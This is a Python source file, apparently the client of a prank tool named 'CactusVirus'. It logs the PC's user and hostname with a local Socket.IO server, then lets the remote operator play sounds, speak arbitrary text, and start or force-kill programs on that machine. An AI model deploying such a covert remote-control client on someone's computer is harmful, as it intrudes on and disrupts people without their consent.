import os
import socket
import getpass
import winsound
import socketio
import subprocess
from gtts import gTTS
from vendor import playsound

io = socketio.Client()
username = getpass.getuser() + "@" + socket.gethostname()

soundbox_path = r"C:\Users\quent\Desktop\Perso\CactusVirus\Client\assets\Soundbox\\"
goose_path = r"C:\Users\quent\Desktop\Perso\CactusVirus\Client\assets\Goose\\"
flash_path = r"C:\Users\quent\Desktop\Perso\CactusVirus\Client\assets\FlashCoucou\\"
soundlist = ["nopal-earrape", "passe-partout", "rene-ballek", "tabarnak", "wii-sport", "pauvre-conne", "patrick-ftg", "losing-horn", "titanic", "nani", "meuh", "fbi", "bien-evidement", "fanta-decision", "padami", "ntm", "spiderman", "colère"]
flash_coucou = ["flash-jfp", "flash-blanquer", "flash-michel", "flash-jpk"]

@io.on("event-launched")
def event_triggered(data):

    print(data)

    if data["event"] in soundlist and data["user"] == username:
        winsound.PlaySound(soundbox_path + data["event"] + ".wav", winsound.SND_ASYNC)
    
    elif data["event"] == "stop" and data["user"] == username:
        winsound.PlaySound(None, winsound.SND_PURGE)

    elif data["event"] == "spawn" and data["user"] == username:
        DETACHED_PROCESS = 0x00000008
        subprocess.call(goose_path + "GooseDesktop.exe", creationflags=DETACHED_PROCESS)

    elif data["event"] == "kill" and data["user"] == username:
        os.system("taskkill/f /im goosedesktop.exe")

    elif data["event"] in flash_coucou and data["user"] == username:
        DETACHED_PROCESS = 0x00000008
        subprocess.call(f"python {flash_path}\FlashCoucou.pyw {flash_path} {data['event']}", creationflags=DETACHED_PROCESS)

    elif "tts\n" in data["event"] and data["user"] == username:
        sentence = data["event"].split("\n")[1]
        tts = gTTS(sentence, lang="fr")
        tts.save("sentence.mp3")
        playsound.playsound("sentence.mp3")
        os.remove("sentence.mp3")


io.connect("http://localhost:3000")
io.emit("login", username)
